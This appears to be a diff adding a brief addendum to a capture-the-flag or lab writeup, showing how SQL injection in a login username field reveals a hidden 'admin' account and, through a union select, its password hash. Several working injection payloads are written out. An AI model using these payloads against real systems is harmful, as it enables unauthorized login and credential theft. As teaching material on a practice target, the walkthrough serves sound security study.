@@ -1,0 +1,15 @@
+In addition to the user caligula, there is another user admin which can be
+detected in a number of ways.
+
+By trying a username of 
+    "' or 1 order by random() --"
+a few times or else trying out other orderings such as
+    "' or 1 order by username --"
+or even just guessing "admin" and putting a username of
+    "admin' --"
+
+The same trick with the union operator from the writeup can be
+performed on the "admin" user. By submitting a username of
+    "' union select password from users where username='admin' --"
+the password for the admin user is shown, which happens to
+contain an md5 hash.
